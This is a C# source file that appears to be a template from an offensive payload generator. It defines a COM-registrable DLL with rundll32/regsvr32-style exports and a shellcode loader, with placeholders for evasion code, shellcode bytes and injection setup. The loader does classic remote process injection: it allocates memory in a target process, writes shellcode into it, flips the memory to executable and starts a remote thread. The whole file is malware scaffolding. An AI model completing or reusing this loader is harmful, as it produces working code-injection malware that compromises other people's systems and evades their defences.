using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

//####STRONG_NAME_REQUIRED####

//####INCLUDE####

//####DEFINE####

//####CODE####


namespace OdDll
{

    
    [ComVisible(true)]
    [Guid("EAF4F4FC-1499-4174-8A3C-937FB7C75192")]  // Generate a new GUID
    [ClassInterface(ClassInterfaceType.None)]
    public class OdClass
    {
        [DllImport("kernel32")]
        public static extern bool AllocConsole();

        [DllExport("EntryPoint", CallingConvention = CallingConvention.Cdecl)]
        public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
        {
            Console.WriteLine("Hello There From EntryPoint");
        }

        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllRegisterServer()
        {
            Console.WriteLine("Hello There From DllRegisterServer");
        }

        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllUnregisterServer()
        {
            Console.WriteLine("Hello There From DllUnregisterServer");
        }
    }


    internal class ComConDll
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        
        public static void COMDllDo()
        {
           
            //####EVASION####

            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;

            //####CALL####

            //####INJECTION#### 
            
            // Allocate RW space for shellcode in target process
            IntPtr lpBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);

            // Copy shellcode to target process
            IntPtr outSize;
            WriteProcessMemory(hProcess, lpBaseAddress, buf, buf.Length, out outSize);

            // Change memory protection to executable
            uint lpflOldProtect;
            VirtualProtectEx(hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);

            // Create remote thread in target process
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
